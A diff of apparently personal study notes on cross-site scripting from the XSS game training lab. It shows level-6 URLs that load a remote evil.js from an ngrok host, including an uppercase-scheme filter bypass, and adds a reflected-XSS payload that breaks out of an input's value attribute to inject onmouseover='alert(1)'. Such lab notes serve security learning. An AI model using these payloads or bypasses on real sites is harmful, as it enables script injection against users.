@@ -704,3 +704,16 @@ So, we have to bypass with uppercase (or) without having https or http
 https://xss-game.appspot.com/level6/frame#//99df-210-10-6-227.ngrok-free.app/evil.js
 
 https://xss-game.appspot.com/level6/frame#HTTPS://99df-210-10-6-227.ngrok-free.app/evil.js
+
+___________________________________________________________________________________________________________________________________________________________________
+Reflected XSS in <input attribute>
+-----------------------------------
+
+When we insert the test > it is in the input value <input type="text" value="test">
+
+So,we have to break the value attribute and put the onmouseover attribute with alert value
+
+final result --> <input type="text" value= " " onmouseover="alert(1)">
+
+payload = " onmouseover="alert(1)
+ 
